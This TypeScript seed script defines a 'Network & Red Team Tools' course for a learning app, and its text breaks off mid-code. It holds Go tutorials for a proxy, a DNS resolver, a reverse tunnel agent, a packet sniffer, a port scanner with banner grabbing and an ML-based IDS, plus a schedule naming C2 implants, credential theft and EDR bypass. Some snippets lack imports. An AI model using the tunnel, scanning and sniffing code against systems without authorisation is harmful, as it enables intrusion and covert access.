import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import * as schema from '../src/lib/server/schema';

const sqlite = new Database('data/quest-log.db');

const db = drizzle(sqlite, { schema });

interface TaskData {
	title: string;
	description: string;
	details: string;
}

interface ModuleData {
	name: string;
	description: string;
	tasks: TaskData[];
}

interface PathData {
	name: string;
	description: string;
	language: string;
	color: string;
	skills: string;
	startHint: string;
	difficulty: string;
	estimatedWeeks: number;
	schedule: string;
	modules: ModuleData[];
}

const networkRedteamPath: PathData = {
	name: 'Network & Red Team Tools',
	description: 'Build network applications and offensive security tools using Go and Python. Learn concurrent networking, protocol analysis, and red team techniques.',
	language: 'Go+Python',
	color: 'rose',
	skills: 'network programming, concurrency, protocol analysis, offensive security, evasion techniques, Active Directory',
	startHint: 'Start with a simple port scanner in Go to learn concurrent networking patterns',
	difficulty: 'advanced',
	estimatedWeeks: 12,
	schedule: `## 12-Week Learning Schedule

### Week 1-2: Network Fundamentals (Go)
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | Setup | Install Go, set up dev environment, review net package |
| Tue | TCP | Build basic TCP client/server |
| Wed | UDP | Build UDP client/server, understand differences |
| Thu | Concurrency | Learn goroutines and channels for networking |
| Fri | Scanner | Start building port scanner |
| Weekend | Practice | Complete port scanner with service detection |

### Week 3-4: Network Applications
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Proxy | Build HTTP proxy with caching |
| Wed-Thu | DNS | Implement custom DNS resolver |
| Fri | Packets | Introduction to gopacket |
| Weekend | Sniffer | Build packet sniffer |

### Week 5-6: Reconnaissance Tools
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Subdomains | Build subdomain enumerator |
| Wed-Thu | OSINT | Python OSINT data aggregation |
| Fri-Weekend | Integration | Combine recon tools into pipeline |

### Week 7-8: Initial Access & C2
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Payloads | Go payload generation basics |
| Wed-Thu | C2 Server | Build basic C2 server |
| Fri-Weekend | Implant | Create cross-platform implant |

### Week 9-10: Post-Exploitation
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | Credentials | Credential extraction techniques |
| Wed-Thu | Persistence | Persistence mechanisms |
| Fri-Weekend | Lateral | Lateral movement automation |

### Week 11-12: Active Directory & Evasion
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon-Tue | AD Enum | LDAP enumeration tools |
| Wed-Thu | AD Attacks | Kerberoasting, AS-REP roasting |
| Fri-Weekend | Evasion | AV/EDR bypass techniques |

### Daily Commitment: 3-4 hours

### Lab Environment Required
- Windows AD lab (recommend DVCP or local VMs)
- Kali Linux or similar
- Isolated network for testing`,
	modules: [
		{
			name: 'Network Applications - Go',
			description: 'Build high-performance network applications using Go\'s excellent concurrency primitives',
			tasks: [
				{
					title: 'Build a Reverse Proxy / Load Balancer',
					description: 'Route and distribute traffic across backend servers with health checks',
					details: `## Reverse Proxy / Load Balancer in Go

### Why Go?
- Excellent concurrency with goroutines
- Low latency, high throughput
- Built-in HTTP server and reverse proxy support

### Architecture
\`\`\`
┌─────────────┐     ┌─────────────────────┐     ┌─────────────┐
│   Client    │────▶│   Load Balancer     │────▶│  Backend 1  │
│             │     │   (Your Go App)     │────▶│  Backend 2  │
└─────────────┘     └─────────────────────┘────▶│  Backend 3  │
                                                └─────────────┘
\`\`\`

### Core Implementation

\`\`\`go
package main

import (
    "log"
    "net/http"
    "net/http/httputil"
    "net/url"
    "sync"
    "sync/atomic"
    "time"
)

type Backend struct {
    URL          *url.URL
    Alive        bool
    mux          sync.RWMutex
    ReverseProxy *httputil.ReverseProxy
}

func (b *Backend) SetAlive(alive bool) {
    b.mux.Lock()
    b.Alive = alive
    b.mux.Unlock()
}

func (b *Backend) IsAlive() bool {
    b.mux.RLock()
    alive := b.Alive
    b.mux.RUnlock()
    return alive
}

type LoadBalancer struct {
    backends []*Backend
    current  uint64
}

func (lb *LoadBalancer) NextBackend() *Backend {
    // Round-robin selection
    next := atomic.AddUint64(&lb.current, 1)
    idx := next % uint64(len(lb.backends))

    // Find next alive backend
    for i := 0; i < len(lb.backends); i++ {
        idx := (int(idx) + i) % len(lb.backends)
        if lb.backends[idx].IsAlive() {
            return lb.backends[idx]
        }
    }
    return nil
}

func (lb *LoadBalancer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    backend := lb.NextBackend()
    if backend == nil {
        http.Error(w, "No backends available", http.StatusServiceUnavailable)
        return
    }
    backend.ReverseProxy.ServeHTTP(w, r)
}

func (lb *LoadBalancer) HealthCheck() {
    for _, b := range lb.backends {
        go func(backend *Backend) {
            for {
                resp, err := http.Get(backend.URL.String() + "/health")
                alive := err == nil && resp.StatusCode == 200
                backend.SetAlive(alive)
                if resp != nil {
                    resp.Body.Close()
                }
                time.Sleep(10 * time.Second)
            }
        }(b)
    }
}

func main() {
    backends := []string{
        "http://localhost:8081",
        "http://localhost:8082",
        "http://localhost:8083",
    }

    lb := &LoadBalancer{}
    for _, addr := range backends {
        u, _ := url.Parse(addr)
        proxy := httputil.NewSingleHostReverseProxy(u)
        lb.backends = append(lb.backends, &Backend{
            URL:          u,
            Alive:        true,
            ReverseProxy: proxy,
        })
    }

    lb.HealthCheck()

    log.Println("Load balancer starting on :8080")
    log.Fatal(http.ListenAndServe(":8080", lb))
}
\`\`\`

### Features to Add
1. **Weighted round-robin** - Assign weights to backends
2. **Least connections** - Route to backend with fewest active connections
3. **IP hash** - Sticky sessions based on client IP
4. **Circuit breaker** - Stop sending to failing backends
5. **Metrics** - Prometheus integration for monitoring

### Testing
\`\`\`bash
# Start 3 backend servers
for port in 8081 8082 8083; do
    go run backend.go -port $port &
done

# Start load balancer
go run main.go

# Test with curl
for i in {1..10}; do curl localhost:8080; done
\`\`\``
				},
				{
					title: 'Build a Custom DNS Server / Resolver',
					description: 'Create a DNS server with filtering, caching, and custom records',
					details: `## Custom DNS Server in Go

### Why Go?
- Fast UDP handling
- Single binary deployment
- Excellent DNS libraries available

### Use Cases
- Ad blocking / Pi-hole alternative
- Internal DNS for home lab
- DNS-based load balancing
- Security monitoring (log all queries)

### Implementation with miekg/dns

\`\`\`go
package main

import (
    "log"
    "net"
    "strings"
    "sync"
    "time"

    "github.com/miekg/dns"
)

type DNSServer struct {
    cache     map[string]*CacheEntry
    cacheMux  sync.RWMutex
    blocklist map[string]bool
    upstream  string
}

type CacheEntry struct {
    msg       *dns.Msg
    expiresAt time.Time
}

func NewDNSServer(upstream string) *DNSServer {
    return &DNSServer{
        cache:     make(map[string]*CacheEntry),
        blocklist: make(map[string]bool),
        upstream:  upstream,
    }
}

func (s *DNSServer) AddToBlocklist(domain string) {
    s.blocklist[strings.ToLower(domain)] = true
}

func (s *DNSServer) isBlocked(domain string) bool {
    domain = strings.ToLower(strings.TrimSuffix(domain, "."))
    if s.blocklist[domain] {
        return true
    }
    // Check parent domains
    parts := strings.Split(domain, ".")
    for i := 1; i < len(parts); i++ {
        parent := strings.Join(parts[i:], ".")
        if s.blocklist[parent] {
            return true
        }
    }
    return false
}

func (s *DNSServer) getFromCache(key string) *dns.Msg {
    s.cacheMux.RLock()
    defer s.cacheMux.RUnlock()

    if entry, ok := s.cache[key]; ok {
        if time.Now().Before(entry.expiresAt) {
            return entry.msg.Copy()
        }
    }
    return nil
}

func (s *DNSServer) setCache(key string, msg *dns.Msg, ttl time.Duration) {
    s.cacheMux.Lock()
    defer s.cacheMux.Unlock()

    s.cache[key] = &CacheEntry{
        msg:       msg.Copy(),
        expiresAt: time.Now().Add(ttl),
    }
}

func (s *DNSServer) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
    m := new(dns.Msg)
    m.SetReply(r)
    m.Authoritative = false

    for _, q := range r.Question {
        log.Printf("Query: %s %s", dns.TypeToString[q.Qtype], q.Name)

        // Check blocklist
        if s.isBlocked(q.Name) {
            log.Printf("Blocked: %s", q.Name)
            // Return NXDOMAIN for blocked domains
            m.Rcode = dns.RcodeNameError
            w.WriteMsg(m)
            return
        }

        // Check cache
        cacheKey := q.Name + dns.TypeToString[q.Qtype]
        if cached := s.getFromCache(cacheKey); cached != nil {
            cached.Id = r.Id
            w.WriteMsg(cached)
            return
        }

        // Forward to upstream
        c := new(dns.Client)
        resp, _, err := c.Exchange(r, s.upstream)
        if err != nil {
            log.Printf("Upstream error: %v", err)
            m.Rcode = dns.RcodeServerFailure
            w.WriteMsg(m)
            return
        }

        // Cache response
        if len(resp.Answer) > 0 {
            ttl := time.Duration(resp.Answer[0].Header().Ttl) * time.Second
            s.setCache(cacheKey, resp, ttl)
        }

        w.WriteMsg(resp)
        return
    }

    w.WriteMsg(m)
}

func main() {
    server := NewDNSServer("8.8.8.8:53")

    // Add some blocked domains
    server.AddToBlocklist("ads.example.com")
    server.AddToBlocklist("tracking.example.com")

    dns.HandleFunc(".", server.handleDNS)

    // Start UDP server
    go func() {
        srv := &dns.Server{Addr: ":5353", Net: "udp"}
        log.Printf("Starting DNS server on UDP :5353")
        if err := srv.ListenAndServe(); err != nil {
            log.Fatalf("Failed to start UDP server: %v", err)
        }
    }()

    // Start TCP server
    srv := &dns.Server{Addr: ":5353", Net: "tcp"}
    log.Printf("Starting DNS server on TCP :5353")
    if err := srv.ListenAndServe(); err != nil {
        log.Fatalf("Failed to start TCP server: %v", err)
    }
}
\`\`\`

### Testing
\`\`\`bash
# Query your DNS server
dig @localhost -p 5353 google.com

# Test blocked domain
dig @localhost -p 5353 ads.example.com

# Set as system DNS (macOS)
sudo networksetup -setdnsservers Wi-Fi 127.0.0.1
\`\`\`

### Features to Add
1. **DNS over HTTPS (DoH)** - Encrypted DNS queries
2. **Statistics dashboard** - Query counts, blocked domains
3. **Dynamic blocklist** - Load from URL (like Pi-hole)
4. **Local records** - Add custom A/CNAME records`
				},
				{
					title: 'Build a TCP/UDP Relay for NAT Traversal',
					description: 'Create tunneling and port forwarding tools for NAT traversal',
					details: `## TCP/UDP Relay in Go

### Use Cases
- Access services behind NAT
- Port forwarding
- Tunneling through firewalls
- Simple VPN alternative

### TCP Port Forwarder

\`\`\`go
package main

import (
    "io"
    "log"
    "net"
    "sync"
)

func forward(src, dst net.Conn, wg *sync.WaitGroup) {
    defer wg.Done()
    defer src.Close()
    defer dst.Close()

    io.Copy(dst, src)
}

func handleConnection(localConn net.Conn, remoteAddr string) {
    remoteConn, err := net.Dial("tcp", remoteAddr)
    if err != nil {
        log.Printf("Failed to connect to %s: %v", remoteAddr, err)
        localConn.Close()
        return
    }

    log.Printf("Forwarding %s <-> %s", localConn.RemoteAddr(), remoteAddr)

    var wg sync.WaitGroup
    wg.Add(2)

    go forward(localConn, remoteConn, &wg)
    go forward(remoteConn, localConn, &wg)

    wg.Wait()
}

func main() {
    localAddr := ":8080"
    remoteAddr := "internal-server:22"

    listener, err := net.Listen("tcp", localAddr)
    if err != nil {
        log.Fatalf("Failed to listen: %v", err)
    }
    defer listener.Close()

    log.Printf("Forwarding %s -> %s", localAddr, remoteAddr)

    for {
        conn, err := listener.Accept()
        if err != nil {
            log.Printf("Accept error: %v", err)
            continue
        }
        go handleConnection(conn, remoteAddr)
    }
}
\`\`\`

### Reverse Tunnel (NAT Traversal)

\`\`\`go
// Server (public internet)
package main

import (
    "io"
    "log"
    "net"
    "sync"
)

func main() {
    // Control channel - agents connect here
    controlListener, _ := net.Listen("tcp", ":9000")
    // Public endpoint - users connect here
    publicListener, _ := net.Listen("tcp", ":8080")

    var agentConn net.Conn
    var agentMux sync.Mutex

    // Accept agent connections
    go func() {
        for {
            conn, _ := controlListener.Accept()
            agentMux.Lock()
            if agentConn != nil {
                agentConn.Close()
            }
            agentConn = conn
            agentMux.Unlock()
            log.Printf("Agent connected from %s", conn.RemoteAddr())
        }
    }()

    // Handle public connections
    for {
        publicConn, _ := publicListener.Accept()

        agentMux.Lock()
        agent := agentConn
        agentMux.Unlock()

        if agent == nil {
            publicConn.Close()
            continue
        }

        // Signal agent to create new connection
        agent.Write([]byte("CONNECT\\n"))

        // In real implementation, agent would create
        // a new data connection for each request
    }
}
\`\`\`

\`\`\`go
// Agent (behind NAT)
package main

import (
    "bufio"
    "io"
    "log"
    "net"
    "sync"
)

func main() {
    serverAddr := "public-server:9000"
    localService := "localhost:22"

    for {
        conn, err := net.Dial("tcp", serverAddr)
        if err != nil {
            log.Printf("Failed to connect: %v", err)
            continue
        }

        reader := bufio.NewReader(conn)
        for {
            line, err := reader.ReadString('\\n')
            if err != nil {
                break
            }

            if line == "CONNECT\\n" {
                go func() {
                    // Open connection to local service
                    local, _ := net.Dial("tcp", localService)
                    // Open data channel to server
                    data, _ := net.Dial("tcp", "public-server:9001")

                    var wg sync.WaitGroup
                    wg.Add(2)
                    go func() { io.Copy(local, data); wg.Done() }()
                    go func() { io.Copy(data, local); wg.Done() }()
                    wg.Wait()
                }()
            }
        }
    }
}
\`\`\`

### SOCKS5 Proxy
\`\`\`go
// Implement SOCKS5 for more flexible tunneling
// See github.com/armon/go-socks5 for full implementation
\`\`\``
				},
				{
					title: 'Build a Packet Sniffer with gopacket',
					description: 'Capture and analyze network traffic using gopacket library',
					details: `## Packet Sniffer in Go

### Prerequisites
\`\`\`bash
# macOS
brew install libpcap

# Linux
sudo apt-get install libpcap-dev

# Install gopacket
go get github.com/google/gopacket
go get github.com/google/gopacket/pcap
\`\`\`

### Basic Packet Capture

\`\`\`go
package main

import (
    "fmt"
    "log"
    "time"

    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
)

func main() {
    // Find all devices
    devices, err := pcap.FindAllDevs()
    if err != nil {
        log.Fatal(err)
    }

    fmt.Println("Available devices:")
    for _, device := range devices {
        fmt.Printf("  %s: %s\\n", device.Name, device.Description)
        for _, addr := range device.Addresses {
            fmt.Printf("    IP: %s\\n", addr.IP)
        }
    }

    // Open device for capture
    handle, err := pcap.OpenLive(
        "en0",           // Device name
        1600,            // Snapshot length
        true,            // Promiscuous mode
        pcap.BlockForever,
    )
    if err != nil {
        log.Fatal(err)
    }
    defer handle.Close()

    // Set BPF filter (optional)
    err = handle.SetBPFFilter("tcp port 80 or tcp port 443")
    if err != nil {
        log.Fatal(err)
    }

    // Process packets
    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

    for packet := range packetSource.Packets() {
        printPacketInfo(packet)
    }
}

func printPacketInfo(packet gopacket.Packet) {
    // Ethernet layer
    ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
    if ethernetLayer != nil {
        eth := ethernetLayer.(*layers.Ethernet)
        fmt.Printf("Ethernet: %s -> %s\\n", eth.SrcMAC, eth.DstMAC)
    }

    // IP layer
    ipLayer := packet.Layer(layers.LayerTypeIPv4)
    if ipLayer != nil {
        ip := ipLayer.(*layers.IPv4)
        fmt.Printf("IP: %s -> %s\\n", ip.SrcIP, ip.DstIP)
    }

    // TCP layer
    tcpLayer := packet.Layer(layers.LayerTypeTCP)
    if tcpLayer != nil {
        tcp := tcpLayer.(*layers.TCP)
        fmt.Printf("TCP: %d -> %d [", tcp.SrcPort, tcp.DstPort)
        if tcp.SYN { fmt.Print("SYN ") }
        if tcp.ACK { fmt.Print("ACK ") }
        if tcp.FIN { fmt.Print("FIN ") }
        if tcp.RST { fmt.Print("RST ") }
        if tcp.PSH { fmt.Print("PSH ") }
        fmt.Println("]")
    }

    // Application layer
    appLayer := packet.ApplicationLayer()
    if appLayer != nil {
        payload := appLayer.Payload()
        if len(payload) > 0 {
            fmt.Printf("Payload (%d bytes): %s\\n",
                len(payload),
                truncate(string(payload), 100))
        }
    }

    fmt.Println("---")
}

func truncate(s string, max int) string {
    if len(s) > max {
        return s[:max] + "..."
    }
    return s
}
\`\`\`

### HTTP Request Extractor

\`\`\`go
func extractHTTPRequests(packet gopacket.Packet) {
    appLayer := packet.ApplicationLayer()
    if appLayer == nil {
        return
    }

    payload := string(appLayer.Payload())

    // Check if it's an HTTP request
    if strings.HasPrefix(payload, "GET ") ||
       strings.HasPrefix(payload, "POST ") ||
       strings.HasPrefix(payload, "PUT ") {

        lines := strings.Split(payload, "\\r\\n")
        if len(lines) > 0 {
            fmt.Printf("HTTP Request: %s\\n", lines[0])

            // Extract Host header
            for _, line := range lines[1:] {
                if strings.HasPrefix(line, "Host: ") {
                    fmt.Printf("  Host: %s\\n", line[6:])
                    break
                }
            }
        }
    }
}
\`\`\`

### Features to Add
1. **PCAP file writing** - Save captures for later analysis
2. **Protocol statistics** - Count packets by protocol
3. **Connection tracking** - Track TCP sessions
4. **DNS query logging** - Extract all DNS queries
5. **Credential detection** - Find plaintext passwords (for security auditing)`
				},
				{
					title: 'Build a Network Scanner with Service Detection',
					description: 'Create a fast concurrent port scanner with banner grabbing',
					details: `## Network Scanner in Go

### Why Go?
- Goroutines handle thousands of concurrent connections
- Fast startup, single binary
- Cross-platform compilation

### SYN Scanner (requires root)

\`\`\`go
package main

import (
    "fmt"
    "net"
    "sync"
    "time"
)

type ScanResult struct {
    Port    int
    Open    bool
    Service string
    Banner  string
}

func scanPort(host string, port int, timeout time.Duration) ScanResult {
    result := ScanResult{Port: port}

    address := fmt.Sprintf("%s:%d", host, port)
    conn, err := net.DialTimeout("tcp", address, timeout)

    if err != nil {
        return result
    }
    defer conn.Close()

    result.Open = true
    result.Service = getServiceName(port)

    // Banner grabbing
    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
    banner := make([]byte, 1024)
    n, _ := conn.Read(banner)
    if n > 0 {
        result.Banner = string(banner[:n])
    }

    return result
}

func getServiceName(port int) string {
    services := map[int]string{
        21:   "FTP",
        22:   "SSH",
        23:   "Telnet",
        25:   "SMTP",
        53:   "DNS",
        80:   "HTTP",
        110:  "POP3",
        143:  "IMAP",
        443:  "HTTPS",
        445:  "SMB",
        3306: "MySQL",
        3389: "RDP",
        5432: "PostgreSQL",
        6379: "Redis",
        8080: "HTTP-Alt",
    }
    if name, ok := services[port]; ok {
        return name
    }
    return "Unknown"
}

func scanHost(host string, ports []int, workers int, timeout time.Duration) []ScanResult {
    var results []ScanResult
    var mu sync.Mutex
    var wg sync.WaitGroup

    portChan := make(chan int, len(ports))

    // Start workers
    for i := 0; i < workers; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for port := range portChan {
                result := scanPort(host, port, timeout)
                if result.Open {
                    mu.Lock()
                    results = append(results, result)
                    mu.Unlock()
                }
            }
        }()
    }

    // Send ports to workers
    for _, port := range ports {
        portChan <- port
    }
    close(portChan)

    wg.Wait()
    return results
}

func main() {
    host := "scanme.nmap.org"

    // Common ports
    ports := []int{
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139,
        143, 443, 445, 993, 995, 1723, 3306, 3389,
        5432, 5900, 8080, 8443,
    }

    // Or scan a range
    // for i := 1; i <= 1024; i++ { ports = append(ports, i) }

    fmt.Printf("Scanning %s...\\n", host)
    start := time.Now()

    results := scanHost(host, ports, 100, 2*time.Second)

    fmt.Printf("\\nOpen ports on %s:\\n", host)
    fmt.Println("PORT\\tSERVICE\\tBANNER")
    for _, r := range results {
        banner := r.Banner
        if len(banner) > 50 {
            banner = banner[:50] + "..."
        }
        banner = strings.ReplaceAll(banner, "\\n", " ")
        fmt.Printf("%d\\t%s\\t%s\\n", r.Port, r.Service, banner)
    }

    fmt.Printf("\\nScan completed in %v\\n", time.Since(start))
}
\`\`\`

### Service Fingerprinting

\`\`\`go
func fingerprintService(host string, port int) string {
    probes := map[string][]byte{
        "HTTP":  []byte("GET / HTTP/1.0\\r\\n\\r\\n"),
        "SSH":   nil, // SSH sends banner first
        "SMTP":  nil, // SMTP sends banner first
        "FTP":   nil, // FTP sends banner first
    }

    conn, err := net.DialTimeout("tcp",
        fmt.Sprintf("%s:%d", host, port),
        3*time.Second)
    if err != nil {
        return "closed"
    }
    defer conn.Close()

    // Try to read banner first
    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
    banner := make([]byte, 1024)
    n, _ := conn.Read(banner)

    if n > 0 {
        response := string(banner[:n])
        if strings.HasPrefix(response, "SSH-") {
            return "SSH: " + strings.TrimSpace(response)
        }
        if strings.HasPrefix(response, "220") {
            if strings.Contains(response, "FTP") {
                return "FTP: " + strings.TrimSpace(response)
            }
            return "SMTP: " + strings.TrimSpace(response)
        }
    }

    // Send HTTP probe
    conn.Write(probes["HTTP"])
    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
    n, _ = conn.Read(banner)
    if n > 0 {
        response := string(banner[:n])
        if strings.Contains(response, "HTTP/") {
            // Extract server header
            for _, line := range strings.Split(response, "\\r\\n") {
                if strings.HasPrefix(line, "Server: ") {
                    return "HTTP: " + line[8:]
                }
            }
            return "HTTP"
        }
    }

    return "unknown"
}
\`\`\`

### Features to Add
1. **OS detection** - TCP/IP stack fingerprinting
2. **Version detection** - Match banners against database
3. **Output formats** - JSON, XML, grepable
4. **Subnet scanning** - CIDR range support
5. **Rate limiting** - Avoid detection/blocking`
				},
				{
					title: 'Build a WebSocket Server for Real-time Communication',
					description: 'Create a WebSocket server for bidirectional real-time messaging',
					details: `## WebSocket Server in Go

### Why Go?
- Native WebSocket support in x/net
- Gorilla/websocket for production use
- Handle thousands of concurrent connections

### Implementation with gorilla/websocket

\`\`\`go
package main

import (
    "encoding/json"
    "log"
    "net/http"
    "sync"

    "github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
    ReadBufferSize:  1024,
    WriteBufferSize: 1024,
    CheckOrigin: func(r *http.Request) bool {
        return true // Allow all origins for dev
    },
}

type Message struct {
    Type    string          \`json:"type"\`
    Payload json.RawMessage \`json:"payload"\`
    From    string          \`json:"from,omitempty"\`
}

type Client struct {
    ID   string
    Conn *websocket.Conn
    Send chan []byte
}

type Hub struct {
    clients    map[*Client]bool
    broadcast  chan []byte
    register   chan *Client
    unregister chan *Client
    mu         sync.RWMutex
}

func newHub() *Hub {
    return &Hub{
        clients:    make(map[*Client]bool),
        broadcast:  make(chan []byte),
        register:   make(chan *Client),
        unregister: make(chan *Client),
    }
}

func (h *Hub) run() {
    for {
        select {
        case client := <-h.register:
            h.mu.Lock()
            h.clients[client] = true
            h.mu.Unlock()
            log.Printf("Client connected: %s", client.ID)

        case client := <-h.unregister:
            h.mu.Lock()
            if _, ok := h.clients[client]; ok {
                delete(h.clients, client)
                close(client.Send)
            }
            h.mu.Unlock()
            log.Printf("Client disconnected: %s", client.ID)

        case message := <-h.broadcast:
            h.mu.RLock()
            for client := range h.clients {
                select {
                case client.Send <- message:
                default:
                    close(client.Send)
                    delete(h.clients, client)
                }
            }
            h.mu.RUnlock()
        }
    }
}

func (c *Client) readPump(hub *Hub) {
    defer func() {
        hub.unregister <- c
        c.Conn.Close()
    }()

    for {
        _, message, err := c.Conn.ReadMessage()
        if err != nil {
            break
        }

        // Add sender info
        var msg Message
        json.Unmarshal(message, &msg)
        msg.From = c.ID
        enriched, _ := json.Marshal(msg)

        hub.broadcast <- enriched
    }
}

func (c *Client) writePump() {
    defer c.Conn.Close()

    for message := range c.Send {
        err := c.Conn.WriteMessage(websocket.TextMessage, message)
        if err != nil {
            break
        }
    }
}

func serveWs(hub *Hub, w http.ResponseWriter, r *http.Request) {
    conn, err := upgrader.Upgrade(w, r, nil)
    if err != nil {
        log.Println(err)
        return
    }

    clientID := r.URL.Query().Get("id")
    if clientID == "" {
        clientID = fmt.Sprintf("client-%d", time.Now().UnixNano())
    }

    client := &Client{
        ID:   clientID,
        Conn: conn,
        Send: make(chan []byte, 256),
    }

    hub.register <- client

    go client.writePump()
    go client.readPump(hub)
}

func main() {
    hub := newHub()
    go hub.run()

    http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
        serveWs(hub, w, r)
    })

    log.Println("WebSocket server starting on :8080")
    log.Fatal(http.ListenAndServe(":8080", nil))
}
\`\`\`

### Client Example (JavaScript)
\`\`\`javascript
const ws = new WebSocket('ws://localhost:8080/ws?id=user1');

ws.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    console.log('Received:', msg);
};

ws.onopen = () => {
    ws.send(JSON.stringify({
        type: 'chat',
        payload: { text: 'Hello!' }
    }));
};
\`\`\`

### Features to Add
1. **Rooms/channels** - Group clients by topic
2. **Authentication** - JWT validation on connect
3. **Heartbeat** - Ping/pong for connection health
4. **Message persistence** - Store in Redis/DB
5. **Horizontal scaling** - Redis pub/sub for multi-instance`
				}
			]
		},
		{
			name: 'Network Applications - Go + Python Hybrid',
			description: 'Combine Go performance with Python ML/analysis capabilities',
			tasks: [
				{
					title: 'Build an IDS/IPS with ML-based Anomaly Detection',
					description: 'Go for packet capture, Python for ML-based threat detection',
					details: `## Intrusion Detection System (IDS/IPS)

### Architecture
\`\`\`
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Go Capture     │────▶│  Feature Queue  │────▶│  Python ML      │
│  (gopacket)     │     │  (Redis/ZMQ)    │     │  (scikit-learn) │
└─────────────────┘     └─────────────────┘     └────────┬────────┘
        │                                                │
        │ Block IP                                       │ Alert
        ▼                                                ▼
┌─────────────────┐                             ┌─────────────────┐
│  Firewall API   │◀────────────────────────────│  Alert System   │
│  (iptables)     │                             │  (webhook/log)  │
└─────────────────┘                             └─────────────────┘
\`\`\`

### Go Packet Capture & Feature Extraction

\`\`\`go
package main

import (
    "encoding/json"
    "log"
    "time"

    "github.com/go-redis/redis/v8"
    "github.com/google/gopacket"
    "github.com/google/gopacket/layers"
    "github.com/google/gopacket/pcap"
)

type FlowFeatures struct {
    Timestamp     int64   \`json:"timestamp"\`
    SrcIP         string  \`json:"src_ip"\`
    DstIP         string  \`json:"dst_ip"\`
    SrcPort       uint16  \`json:"src_port"\`
    DstPort       uint16  \`json:"dst_port"\`
    Protocol      string  \`json:"protocol"\`
    PacketSize    int     \`json:"packet_size"\`
    TCPFlags      string  \`json:"tcp_flags"\`
    PayloadSize   int     \`json:"payload_size"\`
    // Aggregated features (computed over window)
    PacketsPerSec float64 \`json:"packets_per_sec"\`
    BytesPerSec   float64 \`json:"bytes_per_sec"\`
    UniqueDestIPs int     \`json:"unique_dest_ips"\`
}

func extractFeatures(packet gopacket.Packet) *FlowFeatures {
    features := &FlowFeatures{
        Timestamp: time.Now().UnixMilli(),
    }

    // IP layer
    if ipLayer := packet.Layer(layers.LayerTypeIPv4); ipLayer != nil {
        ip := ipLayer.(*layers.IPv4)
        features.SrcIP = ip.SrcIP.String()
        features.DstIP = ip.DstIP.String()
        features.Protocol = ip.Protocol.String()
        features.PacketSize = len(packet.Data())
    }

    // TCP layer
    if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
        tcp := tcpLayer.(*layers.TCP)
        features.SrcPort = uint16(tcp.SrcPort)
        features.DstPort = uint16(tcp.DstPort)
        features.TCPFlags = formatTCPFlags(tcp)
        if tcp.Payload != nil {
            features.PayloadSize = len(tcp.Payload)
        }
    }

    // UDP layer
    if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
        udp := udpLayer.(*layers.UDP)
        features.SrcPort = uint16(udp.SrcPort)
        features.DstPort = uint16(udp.DstPort)
    }

    return features
}

func formatTCPFlags(tcp *layers.TCP) string {
    flags := ""
    if tcp.SYN { flags += "S" }
    if tcp.ACK { flags += "A" }
    if tcp.FIN { flags += "F" }
    if tcp.RST { flags += "R" }
    if tcp.PSH { flags += "P" }
    if tcp.URG { flags += "U" }
    return flags
}

func main() {
    // Connect to Redis
    rdb := redis.NewClient(&redis.Options{
        Addr: "localhost:6379",
    })

    // Open capture
    handle, err := pcap.OpenLive("en0", 65536, true, pcap.BlockForever)
    if err != nil {
        log.Fatal(err)
    }
    defer handle.Close()

    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

    for packet := range packetSource.Packets() {
        features := extractFeatures(packet)
        if features.SrcIP != "" {
            data, _ := json.Marshal(features)
            rdb.LPush(ctx, "packet_features", data)
        }
    }
}
\`\`\`

### Python ML Anomaly Detector

\`\`\`python
import json
import redis
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
from collections import defaultdict
import time

class AnomalyDetector:
    def __init__(self):
        self.redis = redis.Redis()
        self.model = IsolationForest(
            contamination=0.1,
            random_state=42
        )
        self.scaler = StandardScaler()
        self.is_trained = False
        self.training_data = []

        # Flow tracking
        self.flow_stats = defaultdict(lambda: {
            'packet_count': 0,
            'byte_count': 0,
            'dest_ips': set(),
            'start_time': time.time()
        })

    def extract_ml_features(self, features: dict) -> np.ndarray:
        """Convert packet features to ML feature vector."""
        src_ip = features['src_ip']
        stats = self.flow_stats[src_ip]

        # Update flow stats
        stats['packet_count'] += 1
        stats['byte_count'] += features['packet_size']
        stats['dest_ips'].add(features['dst_ip'])

        elapsed = time.time() - stats['start_time']
        if elapsed < 1:
            elapsed = 1

        return np.array([
            features['packet_size'],
            features['payload_size'],
            features['dst_port'],
            stats['packet_count'] / elapsed,  # packets/sec
            stats['byte_count'] / elapsed,     # bytes/sec
            len(stats['dest_ips']),            # unique destinations
            1 if 'S' in features.get('tcp_flags', '') else 0,  # SYN
            1 if 'R' in features.get('tcp_flags', '') else 0,  # RST
        ])

    def train(self, num_samples=10000):
        """Collect normal traffic samples and train model."""
        print(f"Collecting {num_samples} samples for training...")

        while len(self.training_data) < num_samples:
            data = self.redis.brpop('packet_features', timeout=1)
            if data:
                features = json.loads(data[1])
                ml_features = self.extract_ml_features(features)
                self.training_data.append(ml_features)

        X = np.array(self.training_data)
        X_scaled = self.scaler.fit_transform(X)
        self.model.fit(X_scaled)
        self.is_trained = True
        print("Model trained!")

    def detect(self):
        """Real-time anomaly detection."""
        if not self.is_trained:
            self.train()

        print("Starting anomaly detection...")

        while True:
            data = self.redis.brpop('packet_features', timeout=1)
            if not data:
                continue

